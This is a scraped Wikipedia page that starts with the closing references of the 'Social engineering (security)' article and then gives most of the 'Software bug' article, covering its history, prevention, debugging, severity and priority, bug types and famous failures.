^ "Social Engineering A Young Hacker's Tale" (PDF). 15 February 2013. Retrieved 13 January 2020. {{cite journal}}: Cite journal requires |journal= (help)

^ "43 Best Social Engineering Books of All Time". BookAuthority. Retrieved 22 January 2020.

^ \ (31 August 2018). "Bens Book of the Month Review of Social Engineering The Science of Human Hacking". RSA Conference. Retrieved 22 January 2020.{{cite web}}:  CS1 maint: numeric names: authors list (link)

^ "Book Review: Social Engineering: The Science of Human Hacking". The Ethical Hacker Network. 26 July 2018. Retrieved 22 January 2020.

^ Hadnagy, Christopher; Fincher, Michele (22 January 2020). "Phishing Dark Waters: The Offensive and Defensive Sides of Malicious E-mails". ISACA. Retrieved 22 January 2020.

^ "WTVR:"Protect Your Kids from Online Threats"

^ Larson, Selena (14 August 2017). "Hacker creates organization to unmask child predators". CNN. Retrieved 14 November 2019.

^ Restatement 2d of Torts § 652C.

^ "Congress outlaws pretexting". 109th Congress (2005–2006) H.R.4709 – Telephone Records and Privacy Protection Act of 2006. 2007.

^ Mitnick, K (2002): "The Art of Deception", p. 103 Wiley Publishing Ltd: Indianapolis, Indiana; United States of America. ISBN 0-471-23712-4

^ HP chairman: Use of pretexting 'embarrassing' Stephen Shankland, 8 September 2006 1:08 PM PDT CNET News.com

^ "Calif. court drops charges against Dunn". CNET. 14 March 2007. Retrieved 11 April 2012.

^ "What is Social Engineering | Attack Techniques & Prevention Methods | Imperva". Learning Center. Retrieved 18 February 2020.


Further reading[edit]

Boyington, Gregory. (1990). 'Baa Baa Black Sheep' Published by Gregory Boyington ISBN 0-553-26350-1
Harley, David. 1998 Re-Floating the Titanic: Dealing with Social Engineering Attacks EICAR Conference.
Laribee, Lena. June 2006 Development of methodical social engineering taxonomy project Master's Thesis, Naval Postgraduate School.
Leyden, John. 18 April 2003. Office workers give away passwords for a cheap pen. The Register. Retrieved 2004-09-09.
Long, Johnny. (2008). No Tech Hacking – A Guide to Social Engineering, Dumpster Diving, and Shoulder Surfing Published by Syngress Publishing Inc. ISBN 978-1-59749-215-7
Mann, Ian. (2008). Hacking the Human: Social Engineering Techniques and Security Countermeasures Published by Gower Publishing Ltd. ISBN 0-566-08773-1 or ISBN 978-0-566-08773-8
Mitnick, Kevin, Kasperavičius, Alexis. (2004). CSEPS Course Workbook. Mitnick Security Publishing.
Mitnick, Kevin, Simon, William L., Wozniak, Steve,. (2002). The Art of Deception: Controlling the Human Element of Security Published by Wiley. ISBN 0-471-23712-4 or ISBN 0-7645-4280-X
Hadnagy, Christopher, (2011) Social Engineering: The Art of Human Hacking Published by Wiley. ISBN 0-470-63953-9
N.J. Evans. (2009). "Information Technology Social Engineering: An Academic Definition and Study of Social Engineering-Analyzing the Human Firewall." Graduate Theses and Dissertations. 10709. https://lib.dr.iastate.edu/etd/10709
Z. Wang, L. Sun and H. Zhu. (2020) "Defining Social Engineering in Cybersecurity," in IEEE Access, vol. 8, pp. 85094-85115, doi: 10.1109/ACCESS.2020.2992807.

External links[edit]



Wikimedia Commons has media related to Social engineering (security).

Social Engineering Fundamentals – Securityfocus.com. Retrieved 3 August 2009.
"Social Engineering, the USB Way". Light Reading Inc. 7 June 2006. Archived from the original on 13 July 2006. Retrieved 23 April 2014.
Should Social Engineering be a part of Penetration Testing? – Darknet.org.uk. Retrieved 3 August 2009.
"Protecting Consumers' Phone Records", Electronic Privacy Information Center US Committee on Commerce, Science, and Transportation. Retrieved 8 February 2006.
Plotkin, Hal. Memo to the Press: Pretexting is Already Illegal. Retrieved 9 September 2006.




Retrieved from "https://en.wikipedia.org/w/index.php?title=Social_engineering_(security)&oldid=1136068559"
Categories: Social engineering (computer security)CybercrimeHidden categories: CS1 maint: archived copy as titleCS1 errors: missing periodicalCS1 maint: numeric names: authors listArticles with short descriptionShort description is different from WikidataUse dmy dates from August 2020All articles with specifically marked weasel-worded phrasesArticles with specifically marked weasel-worded phrases from February 2022Commons category link is on Wikidata
 



From Wikipedia, the free encyclopedia


Error, flaw, failure, or fault in a computer program or system
To report a MediaWiki error on Wikipedia, see Wikipedia:Bug reports.


Part of a series onSoftware development
Core activities
Processes
Requirements
Design
Construction
Engineering
Testing
Debugging
Deployment
Maintenance

Paradigms and models
Software engineering
Agile
Cleanroom
Incremental
Prototyping
Spiral
V model
Waterfall

Methodologies and frameworks
ASD
DevOps
DAD
DSDM
FDD
IID
Kanban
Lean SD
LeSS
MDD
MSF
PSP
RAD
RUP
SAFe
Scrum
SEMAT
TDD
TSP
OpenUP
UP
XP

Supporting disciplines
Configuration management
Documentation
Software quality assurance
Project management
User experience

Practices
ATDD
BDD
CCO
CI
CD
DDD
PP
SBE
Stand-up
TDD

Tools
Compiler
Debugger
Profiler
GUI designer
Modeling
IDE
Build automation
Release automation
Infrastructure as code

Standards and bodies of knowledge
BABOK
CMMI
IEEE standards
ISO 9001
ISO/IEC standards
PMBOK
SWEBOK
ITIL
IREB

Glossaries
Artificial intelligence
Computer science
Electrical and electronics engineering

Outlines
Outline of software development
vte
Part of a series onInformation security
Related security categories
Computer security
Automotive security
Cybercrime
Cybersex trafficking
Computer fraud
Cybergeddon
Cyberterrorism
Cyberwarfare
Electronic warfare
Information warfare
Internet security
Mobile security
Network security
Copy protection
Digital rights management

Threats
Adware
Advanced persistent threat
Arbitrary code execution
Backdoors
Hardware backdoors
Code injection
Crimeware
Cross-site scripting
Cryptojacking malware
Botnets
Data breach
Drive-by download
Browser helper objects
Viruses
Data scraping
Denial of service
Eavesdropping
Email fraud
Email spoofing
Exploits
Keyloggers
Logic bombs
Time bombs
Fork bombs
Zip bombs
Fraudulent dialers
Malware
Payload
Phishing
Polymorphic engine
Privilege escalation
Ransomware
Rootkits
Bootkits
Scareware
Shellcode
Spamming
Social engineering
Screen scraping
Spyware
Software bugs
Trojan horses
Hardware Trojans
Remote access trojans
Vulnerability
Web shells
Wiper
Worms
SQL injection
Rogue security software
Zombie

Defenses
Application security
Secure coding
Secure by default
Secure by design
Misuse case
Computer access control
Authentication
Multi-factor authentication
Authorization
Computer security software
Antivirus software
Security-focused operating system
Data-centric security
Code obfuscation
Data masking
Encryption
Firewall
Intrusion detection system
Host-based intrusion detection system (HIDS)
Anomaly detection
Security information and event management (SIEM)
Mobile secure gateway
Runtime application self-protection
vte
A software bug is an error, flaw or fault in the design, development, or operation of computer software that causes it to produce an incorrect or unexpected result, or to behave in unintended ways. The process of finding and correcting bugs is termed "debugging" and often uses formal techniques or tools to pinpoint bugs. Since the 1950s, some computer systems have been designed to deter, detect or auto-correct various computer bugs during operations.
Bugs in software can arise from mistakes and errors made in interpreting and extracting users' requirements, planning a program's design, writing its source code, and from interaction with humans, hardware and programs, such as operating systems or libraries. A program with many, or serious, bugs is often described as buggy. Bugs can trigger errors that may have ripple effects. The effects of bugs may be subtle, such as unintended text formatting, through to more obvious effects such as causing a program to crash, freezing the computer, or causing damage to hardware. Other bugs qualify as security bugs and might, for example, enable a malicious user to bypass access controls in order to obtain unauthorized privileges.[1]
Some software bugs have been linked to disasters. Bugs in code that controlled the Therac-25 radiation therapy machine were directly responsible for patient deaths in the 1980s. In 1996, the European Space Agency's US$1 billion prototype Ariane 5 rocket was destroyed less than a minute after launch due to a bug in the on-board guidance computer program.[2] In 1994, an RAF Chinook helicopter crashed, killing 29; this was initially blamed on pilot error, but was later thought to have been caused by a software bug in the engine-control computer.[3] Buggy software caused the early 21st century British Post Office scandal, the most widespread miscarriage of justice in British legal history.[4]
In 2002, a study commissioned by the US Department of Commerce's National Institute of Standards and Technology concluded that "software bugs, or errors, are so prevalent and so detrimental that they cost the US economy an estimated $59 billion annually, or about 0.6 percent of the gross domestic product".[5]


History[edit]
Main article: Bug (engineering)
The Middle English word bugge is the basis for the terms "bugbear" and "bugaboo" as terms used for a monster.[6]
The term "bug" to describe defects has been a part of engineering jargon since the 1870s[7] and predates electronics and computers; it may have originally been used in hardware engineering to describe mechanical malfunctions. For instance, Thomas Edison wrote in a letter to an associate in 1878:[8]

... difficulties arise—this thing gives out and [it is] then that "Bugs"—as such little faults and difficulties are called—show themselves[9]
Baffle Ball, the first mechanical pinball game, was advertised as being "free of bugs" in 1931.[10] Problems with military gear during World War II were referred to as bugs (or glitches).[11] In a book published in 1942, Louise Dickinson Rich, speaking of a powered ice cutting machine, said, "Ice sawing was suspended until the creator could be brought in to take the bugs out of his darling."[12]
Isaac Asimov used the term "bug" to relate to issues with a robot in his short story "Catch That Rabbit", published in 1944.

 A page from the Harvard Mark II electromechanical computer's log, featuring a dead moth that was removed from the device.
The term "bug" was used in an account by computer pioneer Grace Hopper, who publicized the cause of a malfunction in an early electromechanical computer.[13] A typical version of the story is:

In 1946, when Hopper was released from active duty, she joined the Harvard Faculty at the Computation Laboratory where she continued her work on the Mark II and Mark III. Operators traced an error in the Mark II to a moth trapped in a relay, coining the term bug. This bug was carefully removed and taped to the log book. Stemming from the first bug, today we call errors or glitches in a program a bug.[14]
Hopper was not present when the bug was found, but it became one of her favorite stories.[15] The date in the log book was September 9, 1947.[16][17][18] The operators who found it, including William "Bill" Burke, later of the Naval Weapons Laboratory, Dahlgren, Virginia,[19] were familiar with the engineering term and amusedly kept the insect with the notation "First actual case of bug being found." This log book, complete with attached moth, is part of the collection of the Smithsonian National Museum of American History.[17]
The related term "debug" also appears to predate its usage in computing: the Oxford English Dictionary's etymology of the word contains an attestation from 1945, in the context of aircraft engines.[20]
The concept that software might contain errors dates back to Ada Lovelace's 1843 notes on the analytical engine, in which she speaks of the possibility of program "cards" for Charles Babbage's analytical engine being erroneous:

... an analysing process must equally have been performed in order to furnish the Analytical Engine with the necessary operative data; and that herein may also lie a possible source of error. Granted that the actual mechanism is unerring in its processes, the cards may give it wrong orders.
"Bugs in the System" report[edit]
The Open Technology Institute, run by the group, New America,[21] released a report "Bugs in the System" in August 2016 stating that U.S. policymakers should make reforms to help researchers identify and address software bugs. The report "highlights the need for reform in the field of software vulnerability discovery and disclosure."[22] One of the report's authors said that Congress has not done enough to address cyber software vulnerability, even though Congress has passed a number of bills to combat the larger issue of cyber security.[22]
Government researchers, companies, and cyber security experts are the people who typically discover software flaws. The report calls for reforming computer crime and copyright laws.[22]

The Computer Fraud and Abuse Act, the Digital Millennium Copyright Act and the Electronic Communications Privacy Act criminalize and create civil penalties for actions that security researchers routinely engage in while conducting legitimate security research, the report said.[22]
Terminology[edit]
While the use of the term "bug" to describe software errors is common, many have suggested that it should be abandoned. One argument is that the word "bug" is divorced from a sense that a human being caused the problem, and instead implies that the defect arose on its own, leading to a push to abandon the term "bug" in favor of terms such as "defect", with limited success.[23] Since the 1970s Gary Kildall somewhat humorously suggested to use the term "blunder".[24][25]
In software engineering, mistake metamorphism (from Greek meta = "change", morph = "form") refers to the evolution of a defect in the final stage of software deployment. Transformation of a "mistake" committed by an analyst in the early stages of the software development lifecycle, which leads to a "defect" in the final stage of the cycle has been called 'mistake metamorphism'.[26]
Different stages of a "mistake" in the entire cycle may be described as "mistakes", "anomalies", "faults", "failures", "errors", "exceptions", "crashes", "glitches", "bugs", "defects", "incidents", or "side effects".[26]

Prevention[edit]
 Error resulting from a software bug displayed on two screens at La Croix de Berny station in France.
The software industry has put much effort into reducing bug counts.[27][28] These include:

Typographical errors[edit]
Bugs usually appear when the programmer makes a logic error. Various innovations in programming style and defensive programming are designed to make these bugs less likely, or easier to spot. Some typos, especially of symbols or logical/mathematical operators, allow the program to operate incorrectly, while others such as a missing symbol or misspelled name may prevent the program from operating. Compiled languages can reveal some typos when the source code is compiled.

Development methodologies[edit]
Several schemes assist managing programmer activity so that fewer bugs are produced. Software engineering (which addresses software design issues as well) applies many techniques to prevent defects. For example, formal program specifications state the exact behavior of programs so that design bugs may be eliminated. Unfortunately, formal specifications are impractical for anything but the shortest programs, because of problems of combinatorial explosion and indeterminacy.
Unit testing involves writing a test for every function (unit) that a program is to perform.
In test-driven development unit tests are written before the code and the code is not considered complete until all tests complete successfully.
Agile software development involves frequent software releases with relatively small changes. Defects are revealed by user feedback.
Open source development allows anyone to examine source code. A school of thought popularized by Eric S. Raymond as Linus's law says that popular open-source software has more chance of having few or no bugs than other software, because "given enough eyeballs, all bugs are shallow".[29] This assertion has been disputed, however: computer security specialist Elias Levy wrote that "it is easy to hide vulnerabilities in complex, little understood and undocumented source code," because, "even if people are reviewing the code, that doesn't mean they're qualified to do so."[30] An example of an open-source software bug was the 2008 OpenSSL vulnerability in Debian.

Programming language support[edit]
Programming languages include features to help prevent bugs, such as static type systems, restricted namespaces and modular programming. For example, when a programmer writes (pseudocode) LET REAL_VALUE PI = "THREE AND A BIT", although this may be syntactically correct, the code fails a type check. Compiled languages catch this without having to run the program. Interpreted languages catch such errors at runtime. Some languages deliberately exclude features that easily lead to bugs, at the expense of slower performance: the general principle being that, it is almost always better to write simpler, slower code than inscrutable code that runs slightly faster, especially considering that maintenance cost is substantial. For example, the Java programming language does not support pointer arithmetic; implementations of some languages such as Pascal and scripting languages often have runtime bounds checking of arrays, at least in a debugging build.

Code analysis[edit]
Tools for code analysis help developers by inspecting the program text beyond the compiler's capabilities to spot potential problems. Although in general the problem of finding all programming errors given a specification is not solvable (see halting problem), these tools exploit the fact that human programmers tend to make certain kinds of simple mistakes often when writing software.

Instrumentation[edit]
Tools to monitor the performance of the software as it is running, either specifically to find problems such as bottlenecks or to give assurance as to correct working, may be embedded in the code explicitly (perhaps as simple as a statement saying PRINT "I AM HERE"), or provided as tools. It is often a surprise to find where most of the time is taken by a piece of code, and this removal of assumptions might cause the code to be rewritten.

Testing[edit]
Software testers are people whose primary task is to find bugs, or write code to support testing.  On some projects, more resources may be spent on testing than in developing the program.
Measurements during testing can provide an estimate of the number of likely bugs remaining; this becomes more reliable the longer a product is tested and developed.[citation needed]

Debugging[edit]
Main article: Debugging
 The typical bug history (GNU Classpath project data). A new bug submitted by the user is unconfirmed. Once it has been reproduced by a developer, it is a confirmed bug. The confirmed bugs are later fixed. Bugs belonging to other categories (unreproducible, will not be fixed, etc.) are usually in the minority
Finding and fixing bugs, or debugging, is a major part of computer programming. Maurice Wilkes, an early computing pioneer, described his realization in the late 1940s that much of the rest of his life would be spent finding mistakes in his own programs.[31]
Usually, the most difficult part of debugging is finding the bug. Once it is found, correcting it is usually relatively easy. Programs known as debuggers help programmers locate bugs by executing code line by line, watching variable values, and other features to observe program behavior. Without a debugger, code may be added so that messages or values may be written to a console or to a window or log file to trace program execution or show values.
However, even with the aid of a debugger, locating bugs is something of an art. It is not uncommon for a bug in one section of a program to cause failures in a completely different section,[citation needed] thus making it especially difficult to track (for example, an error in a graphics rendering routine causing a file I/O routine to fail), in an apparently unrelated part of the system.
Sometimes, a bug is not an isolated flaw, but represents an error of thinking or planning on the part of the programmer. Such logic errors require a section of the program to be overhauled or rewritten. As a part of code review, stepping through the code and imagining or transcribing the execution process may often find errors without ever reproducing the bug as such.
More typically, the first step in locating a bug is to reproduce it reliably. Once the bug is reproducible, the programmer may use a debugger or other tool while reproducing the error to find the point at which the program went astray.
Some bugs are revealed by inputs that may be difficult for the programmer to re-create.  One cause of the Therac-25 radiation machine deaths was a bug (specifically, a race condition) that occurred only when the machine operator very rapidly entered a treatment plan; it took days of practice to become able to do this, so the bug did not manifest in testing or when the manufacturer attempted to duplicate it.  Other bugs may stop occurring whenever the setup is augmented to help find the bug, such as running the program with a debugger; these are called heisenbugs (humorously named after the Heisenberg uncertainty principle).
Since the 1990s, particularly following the Ariane 5 Flight 501 disaster, interest in automated aids to debugging rose, such as static code analysis by abstract interpretation.[32]
Some classes of bugs have nothing to do with the code. Faulty documentation or hardware may lead to problems in system use, even though the code matches the documentation. In some cases, changes to the code eliminate the problem even though the code then no longer matches the documentation. Embedded systems frequently work around hardware bugs, since to make a new version of a ROM is much cheaper than remanufacturing the hardware, especially if they are commodity items.

Benchmark of bugs[edit]
To facilitate reproducible research on testing and debugging, researchers use curated benchmarks of bugs:

the Siemens benchmark
ManyBugs[33] is a benchmark of 185 C bugs in nine open-source programs.
Defects4J[34] is a benchmark of 341 Java bugs from 5 open-source projects. It contains the corresponding patches, which cover a variety of patch type.
Bug management[edit]
Bug management includes the process of documenting, categorizing, assigning, reproducing, correcting and releasing the corrected code. Proposed changes to software – bugs as well as enhancement requests and even entire releases – are commonly tracked and managed using bug tracking systems or issue tracking systems.[35] The items added may be called defects, tickets, issues, or, following the agile development paradigm, stories and epics. Categories may be objective, subjective or a combination, such as version number, area of the software, severity and priority, as well as what type of issue it is, such as a feature request or a bug.
A bug triage reviews bugs and decides whether and when to fix them. The decision is based on the bug's priority, and factors such as project schedules. The triage is not meant to investigate the cause of bugs, but rather the cost of fixing them. The triage happens regularly, and goes through bugs opened or reopened since the previous meeting. The attendees of the triage process typically are the project manager, development manager, test manager, build manager, and technical experts.[36][37]

Severity[edit]
Severity is the intensity of the impact the bug has on system operation.[38] This impact may be data loss, financial, loss of goodwill and wasted effort. Severity levels are not standardized. Impacts differ across industry. A crash in a video game has a totally different impact than a crash in a web browser, or real time monitoring system. For example, bug severity levels might be "crash or hang", "no workaround" (meaning there is no way the customer can accomplish a given task), "has workaround" (meaning the user can still accomplish the task), "visual defect" (for example, a missing image or displaced button or form element), or "documentation error". Some software publishers use more qualified severities such as "critical", "high", "low", "blocker" or "trivial".[39] The severity of a bug may be a separate category to its priority for fixing, and the two may be quantified and managed separately.

Priority[edit]
Priority controls where a bug falls on the list of planned changes. The priority is decided by each software producer. Priorities may be numerical, such as 1 through 5, or named, such as "critical", "high", "low", or "deferred". These rating scales may be similar or even identical to severity ratings, but are evaluated as a combination of the bug's severity with its estimated effort to fix; a bug with low severity but easy to fix may get a higher priority than a bug with moderate severity that requires excessive effort to fix. Priority ratings may be aligned with product releases, such as "critical" priority indicating all the bugs that must be fixed before the next software release.
A bug severe enough to delay or halt the release of the product is called a "show stopper"[40] or "showstopper bug".[41] It is named so because it "stops the show" – causes unacceptable product failure.[41]

Software releases[edit]
It is common practice to release software with known, low-priority bugs. Bugs of sufficiently high priority may warrant a special release of part of the code containing only modules with those fixes. These are known as patches. Most releases include a mixture of behavior changes and multiple bug fixes. Releases that emphasize bug fixes are known as maintenance releases, to differentiate it from major releases that emphasize feature additions or changes.
Reasons that a software publisher opts not to patch or even fix a particular bug include:

A deadline must be met and resources are insufficient to fix all bugs by the deadline.[42]
The bug is already fixed in an upcoming release, and it is not of high priority.
The changes required to fix the bug are too costly or affect too many other components, requiring a major testing activity.
It may be suspected, or known, that some users are relying on the existing buggy behavior; a proposed fix may introduce a breaking change.
The problem is in an area that will be obsolete with an upcoming release; fixing it is unnecessary.
"It's not a bug, it's a feature".[43] A misunderstanding has arisen between expected and perceived behavior or undocumented feature.
Types[edit]
This section is in list format but may read better as prose. You can help by converting this section, if appropriate. Editing help is available. (August 2015)
In software development projects, a mistake or error may be introduced at any stage. Bugs arise from oversight or misunderstanding by a software team during specification, design, coding, configuration, data entry or documentation. For example, a relatively simple program to alphabetize a list of words, the design might fail to consider what should happen when a word contains a hyphen. Or when converting an abstract design into code, the coder might inadvertently create an off-by-one error which can be a "<" where "<=" was intended, and fail to sort the last word in a list.
Another category of bug is called a race condition that may occur when programs have multiple components executing at the same time. If the components interact in a different order than the developer intended, they could interfere with each other and stop the program from completing its tasks. These bugs may be difficult to detect or anticipate, since they may not occur during every execution of a program.
Conceptual errors are a developer's misunderstanding of what the software must do. The resulting software may perform according to the developer's understanding, but not what is really needed. Other types:

Arithmetic[edit]
In operations on numerical values, problems can arise that result in unexpected output, slowing of a process, or crashing.[44] These can be from a lack of awareness of the qualities of the data storage such as a loss of precision due to rounding, numerically unstable algorithms, arithmetic overflow and underflow, or from lack of awareness of how calculations are handled by different software coding languages such as division by zero which in some languages may throw an exception, and in others may return a special value such as NaN or infinity.

Control flow[edit]
See also: Logic error
Control flow bugs are those found in processes with valid logic, but that lead to unintended results, such as infinite loops and infinite recursion, incorrect comparisons for conditional statements such as using the incorrect comparison operator, and off-by-one errors (counting one too many or one too few iterations when looping).

Interfacing[edit]
Incorrect API usage.
Incorrect protocol implementation.
Incorrect hardware handling.
Incorrect assumptions of a particular platform.
Incompatible systems. A new API or communications protocol may seem to work when two systems use different versions, but errors may occur when a function or feature implemented in one version is changed or missing in another. In production systems which must run continually, shutting down the entire system for a major update may not be possible, such as in the telecommunication industry[45] or the internet.[46][47][48] In this case, smaller segments of a large system are upgraded individually, to minimize disruption to a large network. However, some sections could be overlooked and not upgraded, and cause compatibility errors which may be difficult to find and repair.
Incorrect code annotations.
Concurrency[edit]
Deadlock, where task A cannot continue until task B finishes, but at the same time, task B cannot continue until task A finishes.
Race condition, where the computer does not perform tasks in the order the programmer intended.
Concurrency errors in critical sections, mutual exclusions and other features of concurrent processing. Time-of-check-to-time-of-use (TOCTOU) is a form of unprotected critical section.
Resourcing[edit]
See also: Runtime error
Null pointer dereference.
Using an uninitialized variable.
Using an otherwise valid instruction on the wrong data type (see packed decimal/binary-coded decimal).
Access violations.
Resource leaks, where a finite system resource (such as memory or file handles) become exhausted by repeated allocation without release.
Buffer overflow, in which a program tries to store data past the end of allocated storage. This may or may not lead to an access violation or storage violation. These are frequently security bugs.
Excessive recursion which—though logically valid—causes stack overflow.
Use-after-free error, where a pointer is used after the system has freed the memory it references.
Double free error.
Syntax[edit]
See also: Syntax error
Use of the wrong token, such as performing assignment instead of equality test. For example, in some languages x=5 will set the value of x to 5 while x==5 will check whether x is currently 5 or some other number. Interpreted languages allow such code to fail. Compiled languages can catch such errors before testing begins.
Teamwork[edit]
Unpropagated updates; e.g. programmer changes "myAdd" but forgets to change "mySubtract", which uses the same algorithm. These errors are mitigated by the Don't Repeat Yourself philosophy.
Comments out of date or incorrect: many programmers assume the comments accurately describe the code.
Differences between documentation and product.
Implications[edit]
The amount and type of damage a software bug may cause naturally affects decision-making, processes and policy regarding software quality. In applications such as human spaceflight, aviation, nuclear power, health care, public transport or automotive safety, since software flaws have the potential to cause human injury or even death, such software will have far more scrutiny and quality control than, for example, an online shopping website. In applications such as banking, where software flaws have the potential to cause serious financial damage to a bank or its customers, quality control is also more important than, say, a photo editing application.
Other than the damage caused by bugs, some of their cost is due to the effort invested in fixing them. In 1978, Lientz et al. showed that the median of projects invest 17 percent of the development effort in bug fixing.[49] In research in 2020 on GitHub repositories showed the median is 20%.[50]


Residual bugs in delivered product[edit]
In 1994, NASA's Goddard Space Flight Center managed to reduce their average number of errors from 4.5 per 1000 lines of code (SLOC) down to 1 per 1000 SLOC.[51]
Another study in 1990 reported that exceptionally good software development processes can achieve deployment failure rates as low as 0.1 per 1000 SLOC.[52] This figure is iterated in literature such as Code Complete by Steve McConnell,[53] and the NASA study on Flight Software Complexity.[54] Some projects even attained zero defects: the firmware in the IBM Wheelwriter typewriter which consists of 63,000 SLOC, and the Space Shuttle software with 500,000 SLOC.[52]

Well-known bugs[edit]
Main article: List of software bugs
A number of software bugs have become well-known, usually due to their severity: examples include various space and military aircraft crashes. Possibly the most famous bug is the Year 2000 problem or Y2K bug, which caused many programs written long before the transition from 19xx to 20xx dates to malfunction, for example treating a date such as "25 Dec 04" as being in 1904, displaying "19100" instead of "2000", and so on. A huge effort at the end of the 20th century resolved the most severe problems, and there were no major consequences.
The 2012 stock trading disruption involved one such incompatibility between the old API and a new API.

In popular culture[edit]
In both the 1968 novel 2001: A Space Odyssey and the corresponding 1968 film 2001: A Space Odyssey, a spaceship's onboard computer, HAL 9000, attempts to kill all its crew members. In the follow-up 1982 novel, 2010: Odyssey Two, and the accompanying 1984 film, 2010, it is revealed that this action was caused by the computer having been programmed with two conflicting objectives: to fully disclose all its information, and to keep the true purpose of the flight secret from the crew; this conflict caused HAL to become paranoid and eventually homicidal.
In the English version of the Nena 1983 song 99 Luftballons (99 Red Balloons) as a result of "bugs in the software", a release of a group of 99 red balloons are mistaken for an enemy nuclear missile launch, requiring an equivalent launch response, resulting in catastrophe.
In the 1999 American comedy Office Space, three employees attempt (unsuccessfully) to exploit their company's preoccupation with the Y2K computer bug using a computer virus that sends rounded-off fractions of a penny to their bank account—a long-known technique described as salami slicing.
The 2004 novel The Bug, by Ellen Ullman, is about a programmer's attempt to find an elusive bug in a database application.[55]
The 2008 Canadian film Control Alt Delete is about a computer programmer at the end of 1999 struggling to fix bugs at his company related to the year 2000 problem.
See also[edit]
Anti-pattern
Bug bounty program
Glitch removal
Hardware bug
ISO/IEC 9126, which classifies a bug as either a defect or a nonconformity
Orthogonal Defect Classification
Racetrack problem
RISKS Digest
Software defect indicator
Software regression
Software rot
Automatic bug fixing
References[edit]


^ Mittal, Varun; Aditya, Shivam (January 1, 2015). "Recent Developments in the Field of Bug Fixing". Procedia Computer Science. International Conference on Computer, Communication and Convergence (ICCC 2015). 48: 288–297. doi:10.1016/j.procs.2015.04.184. ISSN 1877-0509.

^ "Ariane 501 - Presentation of Inquiry Board report". www.esa.int. Retrieved January 29, 2022.

^ Prof. Simon Rogerson. "The Chinook Helicopter Disaster". Ccsr.cse.dmu.ac.uk. Archived from the original on July 17, 2012. Retrieved September 24, 2012.

^ "Post Office scandal ruined lives, inquiry hears". BBC News. February 14, 2022.

^ "Software bugs cost US economy dear". June 10, 2009. Archived from the original on June 10, 2009. Retrieved September 24, 2012.{{cite web}}:  CS1 maint: unfit URL (link)

^ Computerworld staff (September 3, 2011). "Moth in the machine: Debugging the origins of 'bug'". Computerworld. Archived from the original on August 25, 2015.

^ "bug". Oxford English Dictionary (Online ed.). Oxford University Press. (Subscription or participating institution membership required.) 5a

^ "Did You Know? Edison Coined the Term "Bug"". August 1, 2013. Retrieved July 19, 2019.

^ Edison to Puskas, 13 November 1878, Edison papers, Edison National Laboratory, U.S. National Park Service, West Orange, N.J., cited in  Hughes, Thomas Parke (1989). American Genesis: A Century of Invention and Technological Enthusiasm, 1870-1970. Penguin Books. p. 75. ISBN 978-0-14-009741-2.

^ "Baffle Ball". Internet Pinball Database. (See image of advertisement in reference entry)

^ "Modern Aircraft Carriers are Result of 20 Years of Smart Experimentation". Life. June 29, 1942. p. 25. Archived from the original on June 4, 2013. Retrieved November 17, 2011.

^ Dickinson Rich, Louise (1942), We Took to the Woods, JB Lippincott Co, p. 93, LCCN 42024308, OCLC 405243, archived from the original on March 16, 2017.

^ FCAT NRT Test, Harcourt, March 18, 2008

^ "Danis, Sharron Ann: "Rear Admiral Grace Murray Hopper"". ei.cs.vt.edu. February 16, 1997. Retrieved January 31, 2010.

^ James S. Huggins. "First Computer Bug". Jamesshuggins.com. Archived from the original on August 16, 2000. Retrieved September 24, 2012.

^ "Bug Archived March 23, 2017, at the Wayback Machine", The Jargon File, ver. 4.4.7. Retrieved June 3, 2010.

^ a b "Log Book With Computer Bug Archived March 23, 2017, at the Wayback Machine", National Museum of American History, Smithsonian Institution.

^ "The First "Computer Bug", Naval Historical Center. But note the Harvard Mark II computer was not complete until the summer of 1947.

^ IEEE Annals of the History of Computing, Vol 22 Issue 1, 2000

^ Journal of the Royal Aeronautical Society. 49, 183/2, 1945 "It ranged ... through the stage of type test and flight test and 'debugging' ..."

^ Wilson, Andi; Schulman, Ross; Bankston, Kevin; Herr, Trey. "Bugs in the System" (PDF). Open Policy Institute. Archived (PDF) from the original on September 21, 2016. Retrieved August 22, 2016.

^ a b c d Rozens, Tracy (August 12, 2016). "Cyber reforms needed to strengthen software bug discovery and disclosure: New America report – Homeland Preparedness News". Retrieved August 23, 2016.

^ "News at SEI 1999 Archive". cmu.edu. Archived from the original on May 26, 2013.

^ Shustek, Len (August 2, 2016). "In His Own Words: Gary Kildall". Remarkable People. Computer History Museum. Archived from the original on December 17, 2016.

^ Kildall, Gary Arlen (August 2, 2016) [1993].  Kildall, Scott; Kildall, Kristin (eds.). "Computer Connections: People, Places, and Events in the Evolution of the Personal Computer Industry" (Manuscript, part 1). Kildall Family: 14–15. Archived from the original on November 17, 2016. Retrieved November 17, 2016. {{cite journal}}: Cite journal requires |journal= (help)

^ a b "Testing experience : te : the magazine for professional testers". Testing Experience. Germany: testingexperience: 42. March 2012. ISSN 1866-5705. (subscription required)

^ Huizinga, Dorota; Kolawa, Adam (2007). Automated Defect Prevention: Best Practices in Software Management. Wiley-IEEE Computer Society Press. p. 426. ISBN 978-0-470-04212-0. Archived from the original on April 25, 2012.

^ McDonald, Marc; Musson, Robert; Smith, Ross (2007). The Practical Guide to Defect Prevention. Microsoft Press. p. 480. ISBN 978-0-7356-2253-1.

^ "Release Early, Release Often" Archived May 14, 2011, at the Wayback Machine, Eric S. Raymond, The Cathedral and the Bazaar

^ "Wide Open Source" Archived September 29, 2007, at the Wayback Machine, Elias Levy, SecurityFocus, April 17, 2000

^ Maurice Wilkes Quotes

^ "PolySpace Technologies history". christele.faure.pagesperso-orange.fr. Retrieved August 1, 2019.

^ Le Goues, Claire; Holtschulte, Neal; Smith, Edward K.; Brun, Yuriy; Devanbu, Premkumar; Forrest, Stephanie; Weimer, Westley (2015). "The ManyBugs and IntroClass Benchmarks for Automated Repair of C Programs". IEEE Transactions on Software Engineering. 41 (12): 1236–1256. doi:10.1109/TSE.2015.2454513. ISSN 0098-5589.

^ Just, René; Jalali, Darioush; Ernst, Michael D. (2014). "Defects4J: a database of existing faults to enable controlled testing studies for Java programs". Proceedings of the 2014 International Symposium on Software Testing and Analysis - ISSTA 2014. pp. 437–440. CiteSeerX 10.1.1.646.3086. doi:10.1145/2610384.2628055. ISBN 9781450326452. S2CID 12796895.

^ Allen, Mitch (May–June 2002). "Bug Tracking Basics: A beginner's guide to reporting and tracking defects". Software Testing & Quality Engineering Magazine. Vol. 4, no. 3. pp. 20–24. Retrieved December 19, 2017.

^ Rex Black (2002). Managing The Testing Process (2Nd Ed.). Wiley India Pvt. Limited. p. 139. ISBN 9788126503131. Retrieved June 19, 2021.

